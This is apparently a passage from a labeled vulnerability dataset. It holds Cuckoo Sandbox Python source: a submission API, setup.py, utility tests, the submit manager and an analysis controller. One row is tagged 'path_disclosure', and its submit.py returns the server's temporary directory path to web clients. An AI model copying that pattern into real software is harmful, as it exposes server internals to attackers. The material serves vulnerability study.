            ""route"": config(""routing:routing:route""),
            ""inetsim"": config(""routing:inetsim:enabled""),
            ""tor"": config(""routing:tor:enabled""),
            ""vpns"": vpns,
        },
        ""options"": {
            ""enable-services"": False,
            ""enforce-timeout"": False,
            ""full-memory-dump"": config(""cuckoo:cuckoo:memory_dump""),
            ""no-injection"": False,
            ""process-memory-dump"": True,
            ""simulated-human-interaction"": True,
        },
    }

class SubmissionApi(object):
    @staticmethod
    @csrf_exempt
    @require_http_methods([""POST""])
    def presubmit(request):
        files = request.FILES.getlist(""files[]"")
        data = []

        if files:
            for f in files:
                data.append({
                    ""name"": f.name,
                    ""data"": f.file,
                })

            submit_id = submit_manager.pre(submit_type=""files"", data=data)
            return redirect(""submission/pre"", submit_id=submit_id)
        else:
            body = json.loads(request.body)
            submit_type = body[""type""]

            if submit_type != ""strings"":
                return json_error_response(""type not \""strings\"""")

            submit_id = submit_manager.pre(
                submit_type=submit_type, data=body[""data""].split(""\n"")
            )

            return JsonResponse({
                ""status"": True,
                ""submit_id"": submit_id,
            }, encoder=JsonSerialize)

    @api_post
    def get_files(request, body):
        submit_id = body.get(""submit_id"", 0)
        password = body.get(""password"", None)
        astree = body.get(""astree"", True)

        files = submit_manager.get_files(
            submit_id=submit_id,
            password=password,
            astree=astree
        )

        return JsonResponse({
            ""status"": True,
            ""files"": files,
            ""defaults"": defaults(),
        }, encoder=JsonSerialize)

    @api_post
    def submit(request, body):
        submit_id = body.pop(""submit_id"", None)
        submit_manager.submit(
            submit_id=submit_id, config=body
        )
        return JsonResponse({
            ""status"": True,
            ""submit_id"": submit_id,
        }, encoder=JsonSerialize)
/n/n/nsetup.py/n/n#!/usr/bin/env python
# Copyright (C) 2016-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - https://cuckoosandbox.org/.
# See the file 'docs/LICENSE' for copying permission.

import os
import setuptools
import sys

# Update the MANIFEST.in file to include the one monitor version that is
# actively shipped for this distribution and exclude all the other monitors
# that we have lying around. Note: I tried to do this is in a better manner
# through exclude_package_data, but without much luck.

excl, monitor = [], os.path.join(""cuckoo"", ""data"", ""monitor"")
latest = open(os.path.join(monitor, ""latest""), ""rb"").read().strip()
for h in os.listdir(monitor):
    if h != ""latest"" and h != latest:
        excl.append(
            ""recursive-exclude cuckoo/data/monitor/%s *  # AUTOGENERATED"" % h
        )

if not os.path.isdir(os.path.join(monitor, latest)) and \
        not os.environ.get(""ONLYINSTALL""):
    sys.exit(
        ""Failure locating the monitoring binaries that belong to the latest ""
        ""monitor release. Please include those to create a distribution.""
    )

manifest = []
for line in open(""MANIFEST.in"", ""rb""):
    if not line.strip() or ""# AUTOGENERATED"" in line:
        continue

    manifest.append(line.strip())

manifest.extend(excl)

open(""MANIFEST.in"", ""wb"").write(""\n"".join(manifest) + ""\n"")

def githash():
    """"""Extracts the current Git hash.""""""
    git_head = os.path.join("".git"", ""HEAD"")
    if os.path.exists(git_head):
        head = open(git_head, ""rb"").read().strip()
        if not head.startswith(""ref: ""):
            return head

        git_ref = os.path.join("".git"", head.split()[1])
        if os.path.exists(git_ref):
            return open(git_ref, ""rb"").read().strip()

cwd_path = os.path.join(""cuckoo"", ""data-private"", "".cwd"")
open(cwd_path, ""wb"").write(githash() or """")

install_requires = []

# M2Crypto relies on swig being installed. We also don't support the latest
# version of SWIG. We should be replacing M2Crypto by something else when
# the time allows us to do so.
if os.path.exists(""/usr/bin/swig""):
    install_requires.append(""m2crypto==0.24.0"")

setuptools.setup(
    name=""Cuckoo"",
    version=""2.0.0"",
    author=""Stichting Cuckoo Foundation"",
    author_email=""cuckoo@cuckoofoundation.org"",
    packages=[
        ""cuckoo"",
    ],
    classifiers=[
        ""Development Status :: 4 - Beta"",
        # TODO: should become stable.
        # ""Development Status :: 5 - Production/Stable"",
        ""Environment :: Console"",
        ""Environment :: Web Environment"",
        ""Framework :: Django"",
        ""Framework :: Flask"",
        ""Framework :: Pytest"",
        ""Intended Audience :: Information Technology"",
        ""Intended Audience :: Science/Research"",
        ""Natural Language :: English"",
        ""License :: OSI Approved :: GNU General Public License v3 (GPLv3)"",
        ""Operating System :: POSIX :: Linux"",
        ""Programming Language :: Python :: 2.7"",
        ""Topic :: Security"",
    ],
    url=""https://cuckoosandbox.org/"",
    license=""GPLv3"",
    description=""Automated Malware Analysis System"",
    include_package_data=True,
    entry_points={
        ""console_scripts"": [
            ""cuckoo = cuckoo.main:main"",
        ],
    },
    install_requires=[
        ""alembic==0.8.8"",
        ""androguard==3.0"",
        ""beautifulsoup4==4.4.1"",
        ""chardet==2.3.0"",
        ""click==6.6"",
        ""django==1.8.4"",
        ""django_extensions==1.6.7"",
        ""dpkt==1.8.7"",
        ""elasticsearch==2.2.0"",
        ""flask==0.10.1"",
        ""httpreplay==0.1.18"",
        ""jinja2==2.8"",
        ""jsbeautifier==1.6.2"",
        ""lxml==3.6.0"",
        ""oletools==0.42"",
        ""peepdf==0.3.2"",
        ""pefile2==1.2.11"",
        ""pillow==3.2"",
        ""pymisp==2.4.54"",
        ""pymongo==3.0.3"",
        ""python-dateutil==2.4.2"",
        ""python-magic==0.4.12"",
        ""sflock==0.2.5"",
        ""sqlalchemy==1.0.8"",
        ""wakeonlan==0.2.2"",
    ] + install_requires,
    extras_require={
        "":sys_platform == 'win32'"": [
            ""requests==2.7.0"",
        ],
        "":sys_platform == 'darwin'"": [
            ""requests==2.7.0"",
        ],
        "":sys_platform == 'linux2'"": [
            ""requests[security]==2.7.0"",
            ""scapy==2.3.2"",
        ],
        ""distributed"": [
            ""flask-sqlalchemy==2.1"",
            ""gevent==1.1.1"",
            ""psycopg2==2.6.2"",
        ],
        ""postgresql"": [
            ""psycopg2==2.6.2"",
        ],
    },
    setup_requires=[
        ""pytest-runner"",
    ],
    tests_require=[
        ""coveralls"",
        ""pytest"",
        ""pytest-cov"",
        ""pytest-django"",
        ""pytest-pythonpath"",
        ""flask-sqlalchemy==2.1"",
        ""mock==2.0.0"",
        ""responses==0.5.1"",
    ],
)
/n/n/ntests/test_utils.py/n/n# Copyright (C) 2010-2013 Claudio Guarnieri.
# Copyright (C) 2014-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import cStringIO
import io
import mock
import os
import pytest
import shutil
import tempfile

import cuckoo

from cuckoo.common.exceptions import CuckooOperationalError
from cuckoo.common.files import Folders, Files, Storage, temppath
from cuckoo.common import utils
from cuckoo.misc import set_cwd

class TestCreateFolders:
    def setup(self):
        self.tmp_dir = tempfile.gettempdir()

    def test_root_folder(self):
        """"""Tests a single folder creation based on the root parameter.""""""
        Folders.create(os.path.join(self.tmp_dir, ""foo""))
        assert os.path.exists(os.path.join(self.tmp_dir, ""foo""))
        os.rmdir(os.path.join(self.tmp_dir, ""foo""))

    def test_single_folder(self):
        """"""Tests a single folder creation.""""""
        Folders.create(self.tmp_dir, ""foo"")
        assert os.path.exists(os.path.join(self.tmp_dir, ""foo""))
        os.rmdir(os.path.join(self.tmp_dir, ""foo""))

    def test_multiple_folders(self):
        """"""Tests multiple folders creation.""""""
        Folders.create(self.tmp_dir, [""foo"", ""bar""])
        assert os.path.exists(os.path.join(self.tmp_dir, ""foo""))
        assert os.path.exists(os.path.join(self.tmp_dir, ""bar""))
        os.rmdir(os.path.join(self.tmp_dir, ""foo""))
        os.rmdir(os.path.join(self.tmp_dir, ""bar""))

    def test_copy_folder(self):
        """"""Tests recursive folder copy""""""
        dirpath = tempfile.mkdtemp()
        set_cwd(dirpath)

        Folders.copy(""tests/files/sample_analysis_storage"", dirpath)
        assert os.path.isfile(""%s/reports/report.json"" % dirpath)

    def test_duplicate_folder(self):
        """"""Tests a duplicate folder creation.""""""
        Folders.create(self.tmp_dir, ""foo"")
        assert os.path.exists(os.path.join(self.tmp_dir, ""foo""))
        Folders.create(self.tmp_dir, ""foo"")
        os.rmdir(os.path.join(self.tmp_dir, ""foo""))

    def test_delete_folder(self):
        """"""Tests folder deletion #1.""""""
        Folders.create(self.tmp_dir, ""foo"")
        assert os.path.exists(os.path.join(self.tmp_dir, ""foo""))
        Folders.delete(os.path.join(self.tmp_dir, ""foo""))
        assert not os.path.exists(os.path.join(self.tmp_dir, ""foo""))

    def test_delete_folder2(self):
        """"""Tests folder deletion #2.""""""
        Folders.create(self.tmp_dir, ""foo"")
        assert os.path.exists(os.path.join(self.tmp_dir, ""foo""))
        Folders.delete(self.tmp_dir, ""foo"")
        assert not os.path.exists(os.path.join(self.tmp_dir, ""foo""))

    def test_create_temp(self):
        """"""Test creation of temporary directory.""""""
        dirpath1 = Folders.create_temp(""/tmp"")
        dirpath2 = Folders.create_temp(""/tmp"")
        assert os.path.exists(dirpath1)
        assert os.path.exists(dirpath2)
        assert dirpath1 != dirpath2

    def test_create_temp_conf(self):
        """"""Test creation of temporary directory with configuration.""""""
        dirpath = tempfile.mkdtemp()
        set_cwd(dirpath)

        Folders.create(dirpath, ""conf"")
        with open(os.path.join(dirpath, ""conf"", ""cuckoo.conf""), ""wb"") as f:
            f.write(""[cuckoo]\ntmppath = %s"" % dirpath)

        dirpath2 = Folders.create_temp()
        assert dirpath2.startswith(os.path.join(dirpath, ""cuckoo-tmp""))

    @pytest.mark.skipif(""sys.platform != 'linux2'"")
    def test_create_invld_linux(self):
        """"""Test creation of a folder we can't access.""""""
        with pytest.raises(CuckooOperationalError):
            Folders.create(""/invalid/directory"")

    @pytest.mark.skipif(""sys.platform != 'win32'"")
    def test_create_invld_windows(self):
        """"""Test creation of a folder we can't access.""""""
        with pytest.raises(CuckooOperationalError):
            Folders.create(""Z:\\invalid\\directory"")

    def test_delete_invld(self):
        """"""Test deletion of a folder we can't access.""""""
        dirpath = tempfile.mkdtemp()

        os.chmod(dirpath, 0)
        with pytest.raises(CuckooOperationalError):
            Folders.delete(dirpath)

        os.chmod(dirpath, 0775)
        Folders.delete(dirpath)

    def test_create_tuple(self):
        dirpath = tempfile.mkdtemp()
        Folders.create(dirpath, ""a"")
        Folders.create((dirpath, ""a""), ""b"")
        Files.create((dirpath, ""a"", ""b""), ""c.txt"", ""nested"")

        filepath = os.path.join(dirpath, ""a"", ""b"", ""c.txt"")
        assert open(filepath, ""rb"").read() == ""nested""

class TestCreateFile:
    def test_temp_file(self):
        filepath1 = Files.temp_put(""hello"", ""/tmp"")
        filepath2 = Files.temp_put(""hello"", ""/tmp"")
        assert open(filepath1, ""rb"").read() == ""hello""
        assert open(filepath2, ""rb"").read() == ""hello""
        assert filepath1 != filepath2

    def test_create(self):
        dirpath = tempfile.mkdtemp()
        Files.create(dirpath, ""a.txt"", ""foo"")
        assert open(os.path.join(dirpath, ""a.txt""), ""rb"").read() == ""foo""
        shutil.rmtree(dirpath)

    def test_named_temp(self):
        filepath = Files.temp_named_put(""test"", ""hello.txt"", ""/tmp"")
        assert open(filepath, ""rb"").read() == ""test""
        assert os.path.basename(filepath) == ""hello.txt""

    def test_temp_conf(self):
        dirpath = tempfile.mkdtemp()
        set_cwd(dirpath)

        Folders.create(dirpath, ""conf"")
        with open(os.path.join(dirpath, ""conf"", ""cuckoo.conf""), ""wb"") as f:
            f.write(""[cuckoo]\ntmppath = %s"" % dirpath)

        filepath = Files.temp_put(""foo"")
        assert filepath.startswith(os.path.join(dirpath, ""cuckoo-tmp""))

    def test_stringio(self):
        filepath = Files.temp_put(cStringIO.StringIO(""foo""), ""/tmp"")
        assert open(filepath, ""rb"").read() == ""foo""

    def test_bytesio(self):
        filepath = Files.temp_put(io.BytesIO(""foo""), ""/tmp"")
        assert open(filepath, ""rb"").read() == ""foo""

    def test_create_bytesio(self):
        dirpath = tempfile.mkdtemp()
        filepath = Files.create(dirpath, ""a.txt"", io.BytesIO(""A""*1024*1024))
        assert open(filepath, ""rb"").read() == ""A""*1024*1024

    def test_hash_file(self):
        filepath = Files.temp_put(""hehe"", ""/tmp"")
        assert Files.md5_file(filepath) == ""529ca8050a00180790cf88b63468826a""
        assert Files.sha1_file(filepath) == ""42525bb6d3b0dc06bb78ae548733e8fbb55446b3""
        assert Files.sha256_file(filepath) == ""0ebe2eca800cf7bd9d9d9f9f4aafbc0c77ae155f43bbbeca69cb256a24c7f9bb""

    def test_create_tuple(self):
        dirpath = tempfile.mkdtemp()
        Folders.create(dirpath, ""foo"")
        Files.create((dirpath, ""foo""), ""a.txt"", ""bar"")

        filepath = os.path.join(dirpath, ""foo"", ""a.txt"")
        assert open(filepath, ""rb"").read() == ""bar""

    def test_fd_exhaustion(self):
        fd, filepath = tempfile.mkstemp()

        for x in xrange(0x100):
            Files.temp_put(""foo"")

        fd2, filepath = tempfile.mkstemp()

        # Let's leave a bit of working space.
        assert fd2 - fd < 64

class TestStorage:
    def test_basename(self):
        assert Storage.get_filename_from_path(""C:\\a.txt"") == ""a.txt""
        assert Storage.get_filename_from_path(""C:/a.txt"") == ""a.txt""
        assert Storage.get_filename_from_path(""C:\\\x00a.txt"") == ""\x00a.txt""
        assert Storage.get_filename_from_path(""/tmp/a.txt"") == ""a.txt""
        assert Storage.get_filename_from_path(""../../b.txt"") == ""b.txt""
        assert Storage.get_filename_from_path(""..\\..\\c.txt"") == ""c.txt""

class TestConvertChar:
    def test_utf(self):
        assert ""\\xe9"", utils.convert_char(u""\xe9"")

    def test_digit(self):
        assert ""9"" == utils.convert_char(u""9"")

    def test_literal(self):
        assert ""e"" == utils.convert_char(""e"")

    def test_punctation(self):
        assert ""."" == utils.convert_char(""."")

    def test_whitespace(self):
        assert "" "" == utils.convert_char("" "")

class TestConvertToPrintable:
    def test_utf(self):
        assert ""\\xe9"" == utils.convert_to_printable(u""\xe9"")

    def test_digit(self):
        assert ""9"" == utils.convert_to_printable(u""9"")

    def test_literal(self):
        assert ""e"" == utils.convert_to_printable(""e"")

    def test_punctation(self):
        assert ""."" == utils.convert_to_printable(""."")

    def test_whitespace(self):
        assert "" "" == utils.convert_to_printable("" "")

    def test_non_printable(self):
        assert r""\x0b"" == utils.convert_to_printable(chr(11))

class TestIsPrintable:
    def test_utf(self):
        assert not utils.is_printable(u""\xe9"")

    def test_digit(self):
        assert utils.is_printable(u""9"")

    def test_literal(self):
        assert utils.is_printable(""e"")

    def test_punctation(self):
        assert utils.is_printable(""."")

    def test_whitespace(self):
        assert utils.is_printable("" "")

    def test_non_printable(self):
        assert not utils.is_printable(chr(11))

def test_version():
    from cuckoo import __version__
    from cuckoo.misc import version
    assert __version__ == version

def test_exception():
    s = utils.exception_message()
    assert ""Cuckoo version: %s"" % cuckoo.__version__ in s
    assert ""alembic:"" in s
    assert ""django-extensions:"" in s
    assert ""peepdf:"" in s
    assert ""sflock:"" in s

def test_guid():
    assert utils.guid_name(""{0002e005-0000-0000-c000-000000000046}"") == ""InprocServer32""
    assert utils.guid_name(""{13709620-c279-11ce-a49e-444553540000}"") == ""Shell""

def test_jsbeautify():
    js = {
        ""if(1){a(1,2,3);}"": ""if (1) {\n    a(1, 2, 3);\n}"",
    }
    for k, v in js.items():
        assert utils.jsbeautify(k) == v

@mock.patch(""cuckoo.common.utils.jsbeautifier"")
def test_jsbeautify_packer(p, capsys):
    def beautify(s):
        print u""error: Unknown p.a.c.k.e.r. encoding.\n"",

    p.beautify.side_effect = beautify
    utils.jsbeautify(""thisisjavascript"")
    out, err = capsys.readouterr()
    assert not out and not err

def test_htmlprettify():
    html = {
        ""<a href=google.com>wow</a>"": '<a href=""google.com"">\n wow\n</a>',
    }
    for k, v in html.items():
        assert utils.htmlprettify(k) == v

def test_temppath():
    dirpath = tempfile.mkdtemp()
    set_cwd(dirpath)
    Folders.create(dirpath, ""conf"")

    assert temppath() == tempfile.gettempdir()

    Files.create(
        os.path.join(dirpath, ""conf""), ""cuckoo.conf"",
        ""[cuckoo]\ntmppath = ""
    )
    assert temppath() == tempfile.gettempdir()

    Files.create(
        os.path.join(dirpath, ""conf""), ""cuckoo.conf"",
        ""[cuckoo]\ntmppath = /tmp""
    )
    assert temppath() == tempfile.gettempdir()

    Files.create(
        os.path.join(dirpath, ""conf""), ""cuckoo.conf"",
        ""[cuckoo]\ntmppath = /custom/directory""
    )
    assert temppath() == ""/custom/directory""

def test_bool():
    assert utils.parse_bool(""true"") is True
    assert utils.parse_bool(""True"") is True
    assert utils.parse_bool(""yes"") is True
    assert utils.parse_bool(""on"") is True
    assert utils.parse_bool(""1"") is True

    assert utils.parse_bool(""false"") is False
    assert utils.parse_bool(""False"") is False
    assert utils.parse_bool(""None"") is False
    assert utils.parse_bool(""no"") is False
    assert utils.parse_bool(""off"") is False
    assert utils.parse_bool(""0"") is False

    assert utils.parse_bool(""2"") is True
    assert utils.parse_bool(""3"") is True

    assert utils.parse_bool(True) is True
    assert utils.parse_bool(1) is True
    assert utils.parse_bool(2) is True
    assert utils.parse_bool(False) is False
    assert utils.parse_bool(0) is False

def test_supported_version():
    assert utils.supported_version(""2.0"", ""2.0.0"", None) is True
    assert utils.supported_version(""2.0.0"", ""2.0.0"", None) is True
    assert utils.supported_version(""2.0.0"", ""2.0.0"", ""2.0.1"") is True
    assert utils.supported_version(""2.0.0"", ""2.0.0"", ""2.0.0"") is True

    assert utils.supported_version(""2.0.1a1"", ""2.0.0"", ""2.0.1"") is True
    assert utils.supported_version(""2.0.1a1"", ""2.0.1a0"", ""2.0.1b1"") is True
    assert utils.supported_version(""2.0.1b1"", ""2.0.1"", None) is False
    assert utils.supported_version(""2.0.1b1"", ""2.0.1a1"", None) is True
    assert utils.supported_version(""2.0.1b1"", ""2.0.1a1"", ""2.0.1"") is True

def test_validate_url():
    assert utils.validate_url(""http://google.com/"")
    assert utils.validate_url(""google.com"")
    assert utils.validate_url(""google.com/test"")
    assert utils.validate_url(""https://google.com/"")
    assert not utils.validate_url(""ftp://google.com/"")
/n/n/n",0,path_disclosure
13,45,168cabf86730d56b7fa319278bf0f0034052666a,"/cuckoo/core/submit.py/n/n# Copyright (C) 2016-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import copy
import logging
import os
import sflock

from cuckoo.common.config import emit_options
from cuckoo.common.exceptions import CuckooOperationalError
from cuckoo.common.files import Folders, Files, Storage
from cuckoo.common.utils import validate_url, validate_hash
from cuckoo.common.virustotal import VirusTotalAPI
from cuckoo.core.database import Database

log = logging.getLogger(__name__)

db = Database()

class SubmitManager(object):
    def _handle_string(self, submit, tmppath, line):
        if not line:
            return

        if validate_hash(line):
            try:
                filedata = VirusTotalAPI().hash_fetch(line)
            except CuckooOperationalError as e:
                submit[""errors""].append(
                    ""Error retrieving file hash: %s"" % e
                )
                return

            filepath = Files.create(tmppath, line, filedata)

            submit[""data""].append({
                ""type"": ""file"",
                ""data"": filepath
            })
            return

        if validate_url(line):
            submit[""data""].append({
                ""type"": ""url"",
                ""data"": line
            })
            return

        submit[""errors""].append(
            ""'%s' was neither a valid hash or url"" % line
        )

    def pre(self, submit_type, data):
        """"""
        The first step to submitting new analysis.
        @param submit_type: ""files"" or ""strings""
        @param data: a list of dicts containing ""name"" (file name)
                and ""data"" (file data) or a list of strings (urls or hashes)
        @return: submit id
        """"""
        if submit_type not in (""strings"", ""files""):
            log.error(""Bad parameter '%s' for submit_type"", submit_type)
            return False

        path_tmp = Folders.create_temp()
        submit_data = {
            ""data"": [],
            ""errors"": []
        }

        if submit_type == ""strings"":
            for line in data:
                self._handle_string(submit_data, path_tmp, line)

        if submit_type == ""files"":
            for entry in data:
                filename = Storage.get_filename_from_path(entry[""name""])
                filepath = Files.create(path_tmp, filename, entry[""data""])
                submit_data[""data""].append({
                    ""type"": ""file"",
                    ""data"": filepath
                })

        return Database().add_submit(path_tmp, submit_type, submit_data)

    def get_files(self, submit_id, password=None, astree=False):
        """"""
        Returns files from a submitted analysis.
        @param password: The password to unlock container archives with
        @param astree: sflock option; determines the format in which the files are returned
        @return: A tree of files
        """"""
        submit = Database().view_submit(submit_id)
        files, duplicates = [], []

        for data in submit.data[""data""]:
            if data[""type""] == ""file"":
                filename = Storage.get_filename_from_path(data[""data""])
                filepath = os.path.join(submit.tmp_path, data[""data""])
                filedata = open(filepath, ""rb"").read()

                unpacked = sflock.unpack(
                    filepath=filename, contents=filedata,
                    password=password, duplicates=duplicates
                )

                if astree:
                    unpacked = unpacked.astree()

                files.append(unpacked)
            elif data[""type""] == ""url"":
                files.append({
                    ""filename"": data[""data""],
                    ""filepath"": """",
                    ""relapath"": """",
                    ""selected"": True,
                    ""size"": 0,
                    ""type"": ""url"",
                    ""package"": ""ie"",
                    ""extrpath"": [],
                    ""duplicate"": False,
                    ""children"": [],
                    ""mime"": ""text/html"",
                    ""finger"": {
                        ""magic_human"": ""url"",
                        ""magic"": ""url""
                    }
                })
            else:
                raise RuntimeError(
                    ""Unknown data entry type: %s"" % data[""type""]
                )

        return {
            ""files"": files,
            ""path"": submit.tmp_path,
        }

    def translate_options(self, info, options):
        """"""Translates Web Interface options to Cuckoo database options.""""""
        ret = {}

        if not int(options[""simulated-human-interaction""]):
            ret[""human""] = int(options[""simulated-human-interaction""])

        return emit_options(ret)

    def submit(self, submit_id, config):
        """"""Reads, interprets, and converts the JSON configuration provided by
        the Web Interface into something we insert into the database.""""""
        ret = []
        submit = db.view_submit(submit_id)

        for entry in config[""file_selection""]:
            # Merge the global & per-file analysis options.
            info = copy.deepcopy(config[""global""])
            info.update(entry)
            options = copy.deepcopy(config[""global""][""options""])
            options.update(entry.get(""per_file_options"", {}))

            kw = {
                ""package"": info.get(""package""),
                ""timeout"": info.get(""timeout"", 120),
                ""priority"": info.get(""priority""),
                ""custom"": info.get(""custom""),
                ""owner"": info.get(""owner""),
                ""tags"": info.get(""tags""),
                ""memory"": info.get(""memory""),
                ""enforce_timeout"": options.get(""enforce-timeout""),
                ""machine"": info.get(""machine""),
                ""platform"": info.get(""platform""),
                ""options"": self.translate_options(info, options),
                ""submit_id"": submit_id,
            }

            if entry[""type""] == ""url"":
                ret.append(db.add_url(
                    url=info[""filename""], **kw
                ))
                continue

            # for each selected file entry, create a new temp. folder
            path_dest = Folders.create_temp()

            if not info[""extrpath""]:
                path = os.path.join(
                    submit.tmp_path, os.path.basename(info[""filename""])
                )

                filepath = Files.copy(path, path_dest=path_dest)

                ret.append(db.add_path(
                    file_path=filepath, **kw
                ))
            elif len(info[""extrpath""]) == 1:
                arcpath = os.path.join(
                    submit.tmp_path, os.path.basename(info[""arcname""])
                )
                if not os.path.exists(arcpath):
                    submit.data[""errors""].append(
                        ""Unable to find parent archive file: %s"" %
                        os.path.basename(info[""arcname""])
                    )
                    continue

                arc = sflock.zipify(sflock.unpack(
                    info[""arcname""], contents=open(arcpath, ""rb"").read()
                ))

                # Create a .zip archive out of this container.
                arcpath = Files.temp_named_put(
                    arc, os.path.basename(info[""arcname""])
                )

                ret.append(db.add_archive(
                    file_path=arcpath, filename=info[""filename""], **kw
                ))
            else:
                arcpath = os.path.join(
                    submit.tmp_path, os.path.basename(info[""arcname""])
                )
                if not os.path.exists(arcpath):
                    submit.data[""errors""].append(
                        ""Unable to find parent archive file: %s"" %
                        os.path.basename(info[""arcname""])
                    )
                    continue

                content = sflock.unpack(arcpath).read(info[""extrpath""][:-1])
                subarc = sflock.unpack(info[""extrpath""][-2], contents=content)

                # Write intermediate .zip archive file.
                arcpath = Files.temp_named_put(
                    sflock.zipify(subarc),
                    os.path.basename(info[""extrpath""][-2])
                )

                ret.append(db.add_archive(
                    file_path=arcpath, filename=info[""filename""], **kw
                ))

        return ret
/n/n/n/cuckoo/web/controllers/analysis/analysis.py/n/n# Copyright (C) 2010-2013 Claudio Guarnieri.
# Copyright (C) 2014-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import collections
import os
import pymongo

from django.http import Http404

from cuckoo.core.database import Database, TASK_PENDING
from cuckoo.common.mongo import mongo

db = Database()

class AnalysisController:
    @staticmethod
    def task_info(task_id):
        if not isinstance(task_id, int):
            raise Exception(""Task ID should be integer"")
        data = {}

        task = db.view_task(task_id, details=True)
        if task:
            entry = task.to_dict()
            entry[""guest""] = {}
            if task.guest:
                entry[""guest""] = task.guest.to_dict()

            entry[""errors""] = []
            for error in task.errors:
                entry[""errors""].append(error.message)

            entry[""sample""] = {}
            if task.sample_id:
                sample = db.view_sample(task.sample_id)
                entry[""sample""] = sample.to_dict()

            data[""task""] = entry
        else:
            return Exception(""Task not found"")

        return data

    @staticmethod
    def get_recent(limit=50, offset=0):
        db = Database()
        tasks_files = db.list_tasks(
            limit=limit,
            offset=offset,
            category=""file"",
            not_status=TASK_PENDING)

        tasks_urls = db.list_tasks(
            limit=limit,
            offset=offset,
            category=""url"",
            not_status=TASK_PENDING)

        data = []
        if tasks_files:
            for task in tasks_files:
                new = task.to_dict()
                new[""sample""] = db.view_sample(new[""sample_id""]).to_dict()

                filename = os.path.basename(new[""target""])
                new.update({""filename"": filename})

                if db.view_errors(task.id):
                    new[""errors""] = True

                data.append(new)

        if tasks_urls:
            for task in tasks_urls:
                new = task.to_dict()

                if db.view_errors(task.id):
                    new[""errors""] = True

                data.append(new)

        return data

    @staticmethod
    def get_report(task_id):
        report = AnalysisController._get_report(task_id)
        if not report:
            raise Http404(""the specified analysis does not exist"")

        data = {
            ""analysis"": report
        }

        dnsinfo = AnalysisController._get_dnsinfo(report)
        data.update(dnsinfo)
        return data

    @staticmethod
    def _get_report(task_id):
        return mongo.db.analysis.find_one({
            ""info.id"": int(task_id)
        }, sort=[(""_id"", pymongo.DESCENDING)])

    @staticmethod
    def get_reports(filters):
        cursor = mongo.db.analysis.find(
            filters, sort=[(""_id"", pymongo.DESCENDING)]
        )
        return [report for report in cursor]

    @staticmethod
    def _get_dnsinfo(report):
        """"""Create DNS information dicts by domain and ip""""""

        if ""network"" in report and ""domains"" in report[""network""]:
            domainlookups = dict((i[""domain""], i[""ip""]) for i in report[""network""][""domains""])
            iplookups = dict((i[""ip""], i[""domain""]) for i in report[""network""][""domains""])

            for i in report[""network""][""dns""]:
                for a in i[""answers""]:
                    iplookups[a[""data""]] = i[""request""]
        else:
            domainlookups = dict()
            iplookups = dict()

        return {
            ""domainlookups"": domainlookups,
            ""iplookups"": iplookups,
        }

    @staticmethod
    def get_behavior(task_id, report=None):
        """"""
        Returns behavioral information about an analysis
        sorted by category (files, registry, mutexes, etc)
        @param task_id: The analysis ID
        @param report: JSON analysis blob that is stored in MongoDB (results.json)
        @return: behavioral information as a dict
        """"""
        data = {}
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]
        procs = AnalysisController.behavior_get_processes(task_id, report)

        for proc in procs[""data""]:
            pid = proc[""pid""]
            pname = proc[""process_name""]
            pdetails = None
            for p in report[""behavior""][""generic""]:
                if p[""pid""] == pid:
                    pdetails = p
            if not pdetails:
                continue

            watchers = AnalysisController.behavior_get_watchers(
                task_id, pid=pid, report=report)

            for category, events in watchers.iteritems():
                if not data.has_key(category):
                    data[category] = {}
                if not data[category].has_key(pid):
                    data[category][pname] = {
                        ""pid"": pid,
                        ""process_name"": pname,
                        ""events"": {}
                    }

                for event in events:
                    if not data[category][pname][""events""].has_key(event):
                        data[category][pname][""events""][event] = []
                    for _event in pdetails[""summary""][event]:
                        data[category][pname][""events""][event].append(_event)

        return data

    @staticmethod
    def behavior_get_processes(task_id, report=None):
        if not task_id:
            raise Exception(""missing task_id"")
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]

        data = {
            ""data"": [],
            ""status"": True
        }

        for process in report.get(""behavior"", {}).get(""generic"", []):
            data[""data""].append({
                ""process_name"": process[""process_name""],
                ""pid"": process[""pid""]
            })

        # sort returning list of processes by their name
        data[""data""] = sorted(data[""data""], key=lambda k: k[""process_name""])

        return data

    @staticmethod
    def behavior_get_watchers(task_id, pid, report=None):
        if not task_id or not pid:
            raise Exception(""missing task_id or pid"")
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]

        behavior_generic = report[""behavior""][""generic""]
        process = [z for z in behavior_generic if z[""pid""] == pid]

        if not process:
            raise Exception(""missing pid"")
        else:
            process = process[0]

        data = {}
        for category, watchers in AnalysisController.behavioral_mapping().iteritems():
            for watcher in watchers:
                if watcher in process[""summary""]:
                    if category not in data:
                        data[category] = [watcher]
                    else:
                        data[category].append(watcher)

        return data

    @staticmethod
    def behavior_get_watcher(task_id, pid, watcher, limit=None, offset=0, report=None):
        if not task_id or not watcher or not pid:
            raise Exception(""missing task_id, watcher, and/or pid"")
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]

        behavior_generic = report[""behavior""][""generic""]
        process = [z for z in behavior_generic if z[""pid""] == pid]

        if not process:
            raise Exception(""supplied pid not found"")
        else:
            process = process[0]

        summary = process[""summary""]

        if watcher not in summary:
            raise Exception(""supplied watcher not found"")
        if offset:
            summary[watcher] = summary[watcher][offset:]
        if limit:
            summary[watcher] = summary[watcher][:limit]

        return summary[watcher]

    @staticmethod
    def behavioral_mapping():
        return {
            ""files"":
                [""file_opened"", ""file_read""],
            ""registry"":
                [""regkey_opened"", ""regkey_written"", ""regkey_read""],
            ""mutexes"":
                [""mutex""],
            ""directories"":
                [""directory_created"", ""directory_removed"", ""directory_enumerated""],
            ""processes"":
                [""command_line"", ""dll_loaded""],
        }

    @staticmethod
    def signatures(task_id, signatures=None):
        """"""Returns an OrderedDict containing a lists with signatures based on severity""""""
        if not task_id:
            raise Exception(""missing task_id"")
        if not signatures:
            signatures = AnalysisController.get_report(task_id)[""signatures""]

        data = collections.OrderedDict()
        for signature in signatures:
            severity = signature[""severity""]
            if severity > 3:
                severity = 3
            if not data.has_key(severity):
                data[severity] = []
            data[severity].append(signature)
        return data
